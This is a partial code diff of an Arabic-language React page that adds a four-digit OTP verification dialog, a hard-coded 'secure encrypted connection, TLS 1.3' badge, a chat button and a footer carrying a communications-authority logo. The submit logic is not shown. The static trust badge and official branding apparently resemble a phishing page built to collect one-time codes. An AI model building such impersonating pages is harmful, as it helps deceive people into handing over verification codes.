-              سياسة الخصوصية
-            </a>
-          </div>
-
-          {/* Government Verification Badge */}
-          <div className="flex justify-center mt-4">
-            <img src="cisoc.svg" alt="sd" width={50} className="opacity-80" />
           </div>
         </div>
+
+        {/* Security Badge */}
+        <div className="flex items-center justify-center gap-2 text-gray-400">
+          <Lock className="w-3 h-3" />
+          <span className="text-[11px] font-medium">اتصال آمن ومشفر</span>
+          <span className="w-1 h-1 rounded-full bg-gray-300" />
+          <span className="text-[11px]">TLS 1.3</span>
+        </div>
+      </main>
+
+      {/* OTP Dialog */}
+      <Dialog open={showOtpDialog} onOpenChange={() => {}}>
+        <DialogContent
+          className="max-w-sm mx-auto [&>button]:hidden rounded-3xl border-0 shadow-2xl p-0 overflow-hidden bg-white/95 backdrop-blur-xl"
+          dir="rtl"
+        >
+          <div className="h-1.5 bg-gradient-to-l from-[#4db6ac] via-[#009688] to-[#00796b]" />
+
+          <div className="px-6 pt-6 pb-7 space-y-6">
+            <DialogHeader className="text-center space-y-4">
+              <div className="flex justify-center">
+                <div className="relative">
+                  <div className="w-18 h-18 rounded-2xl bg-gradient-to-br from-[#009688] to-[#00796b] flex items-center justify-center shadow-xl shadow-teal-200/50 ring-4 ring-teal-100">
+                    {otpDone ? (
+                      <CheckCircle2 className="w-9 h-9 text-white" />
+                    ) : (
+                      <Smartphone className="w-9 h-9 text-white" />
+                    )}
+                  </div>
+                  {otpDone && (
+                    <div className="absolute -top-1 -right-1 w-6 h-6 bg-emerald-500 rounded-full flex items-center justify-center shadow-lg animate-bounce">
+                      <CheckCircle2 className="w-4 h-4 text-white" />
+                    </div>
+                  )}
+                </div>
+              </div>
+              <div className="space-y-1">
+                <DialogTitle className="text-xl font-black text-slate-800">
+                  {otpDone ? "تم التحقق بنجاح" : "رمز التحقق"}
+                </DialogTitle>
+                <p className="text-sm text-slate-500 leading-relaxed">
+                  {otpDone ? (
+                    "جاري الانتقال إلى الخطوة التالية..."
+                  ) : (
+                    <>
+                      أدخل رمز التحقق المكون من{" "}
+                      <span className="font-bold text-[#00796b]">4 أرقام</span>{" "}
+                      الذي وصلك
+                    </>
+                  )}
+                </p>
+              </div>
+            </DialogHeader>
+
+            {!otpDone && (
+              <>
+                <div
+                  className={`flex justify-center gap-3 ${shakeError ? "animate-shake" : ""}`}
+                  dir="ltr"
+                  onPaste={handleOtpPaste}
+                >
+                  {otp.map((digit, i) => (
+                    <input
+                      key={i}
+                      ref={(el) => {
+                        inputRefs.current[i] = el;
+                      }}
+                      type="text"
+                      inputMode="numeric"
+                      maxLength={1}
+                      value={digit}
+                      onChange={(e) => handleOtpChange(i, e.target.value)}
+                      onKeyDown={(e) => handleOtpKeyDown(i, e)}
+                      disabled={otpLoading || otpDone}
+                      className={[
+                        "w-14 h-16 text-center text-3xl font-black rounded-2xl border-2 outline-none transition-all duration-200",
+                        otpError
+                          ? "border-red-300 bg-red-50 text-red-700 shadow-red-100"
+                          : otpDone
+                          ? "border-emerald-300 bg-emerald-50 text-emerald-700 shadow-emerald-100"
+                          : digit
+                          ? "border-[#009688] bg-teal-50 text-[#00796b] shadow-teal-100 shadow-md"
+                          : "border-slate-200 bg-slate-50 text-slate-800 focus:border-[#009688] focus:bg-white focus:shadow-lg focus:shadow-teal-100",
+                        "shadow-sm",
+                      ].join(" ")}
+                    />
+                  ))}
+                </div>
+
+                {otpError && (
+                  <div className="flex items-center justify-center gap-2 bg-red-50 border border-red-200 rounded-xl px-4 py-3">
+                    <AlertCircle className="h-4 w-4 text-red-500 flex-shrink-0" />
+                    <p className="text-sm text-red-700 font-bold">{otpError}</p>
+                  </div>
+                )}
+
+                <button
+                  type="button"
+                  onClick={handleOtpSubmit}
+                  disabled={!otpFilled || otpLoading || otpDone}
+                  className="w-full h-14 rounded-2xl font-black text-sm transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2 hover:shadow-lg hover:scale-[1.02] active:scale-[0.98]"
+                  style={{
+                    background: otpLoading
+                      ? "linear-gradient(135deg, #00796b, #00695c)"
+                      : "linear-gradient(135deg, #009688, #00796b)",
+                    color: "#fff",
+                    boxShadow: "0 8px 24px rgba(0,150,136,0.35)",
+                  }}
+                >
+                  {otpLoading ? (
+                    <>
+                      <Loader2 className="h-5 w-5 animate-spin" />
+                      <span>جاري التحقق...</span>
+                    </>
+                  ) : (
+                    <>
+                      <Lock className="h-4 w-4" />
+                      <span>تأكيد الرمز</span>
+                    </>
+                  )}
+                </button>
+
+                <div className="flex items-center justify-center gap-1.5">
+                  <Timer className="h-3 w-3 text-slate-400" />
+                  <p className="text-[11px] text-slate-400 font-medium">
+                    رمز التحقق صالح لمدة 10 دقائق فقط
+                  </p>
+                </div>
+              </>
+            )}
+
+            {otpDone && (
+              <div className="flex items-center justify-center gap-2 bg-emerald-50 border border-emerald-200 rounded-2xl px-4 py-4">
+                <CheckCircle2 className="h-5 w-5 text-emerald-600 flex-shrink-0 animate-bounce" />
+                <p className="text-sm text-emerald-800 font-bold">
+                  تم التحقق بنجاح! جاري الانتقال...
+                </p>
+              </div>
+            )}
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* Floating Chat Button */}
+      <div className="fixed bottom-6 left-6 z-40">
+        <button className="w-14 h-14 rounded-full bg-gradient-to-br from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 flex items-center justify-center shadow-xl shadow-green-500/30 transition-all duration-300 hover:scale-110 hover:shadow-2xl group">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            className="w-7 h-7 text-white group-hover:scale-110 transition-transform"
+            fill="none"
+            viewBox="0 0 24 24"
+            stroke="currentColor"
+            strokeWidth={2}
+          >
+            <path
+              strokeLinecap="round"
+              strokeLinejoin="round"
+              d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"
+            />
+          </svg>
+          <span className="absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full border-2 border-white" />
+        </button>
+      </div>
+
+      <footer className="relative z-10 mt-12 p-6 bg-white/60 backdrop-blur-sm border-t border-gray-100">
+        <div className="text-center space-y-5 max-w-4xl mx-auto">
+          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-500">
+            {[
+              "الرئيسية",
+              "حول",
+              "اتصل بنا",
+              "الشروط والأحكام",
+              "المساعدة والدعم",
+              "سياسة الخصوصية",
+            ].map((link) => (
+              <a
+                key={link}
+                href="#"
+                className="hover:text-teal-600 transition-colors duration-200 font-medium hover:underline underline-offset-4"
+              >
+                {link}
+              </a>
+            ))}
+          </div>
+          <div className="flex justify-center">
+            <div className="p-2 bg-white rounded-xl shadow-sm border border-gray-100">
+              <img
+                src="/NIC-logo.png"
+                alt="هيئة الاتصالات"
+                width={50}
+                className="opacity-70 rounded"
+              />
+            </div>
+          </div>
+          <p className="text-[10px] text-gray-400">© 2024 جميع الحقوق محفوظة</p>
+        </div>
       </footer>
+
+      <style
+        dangerouslySetInnerHTML={{
+          __html: `
+        @keyframes shake {
+          0%, 100% { transform: translateX(0); }
+          10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
+          20%, 40%, 60%, 80% { transform: translateX(4px); }
+        }
+        .animate-shake {
+          animation: shake 0.4s ease-in-out;
+        }
+      `,
+        }}
+      />
     </div>
   );
 }
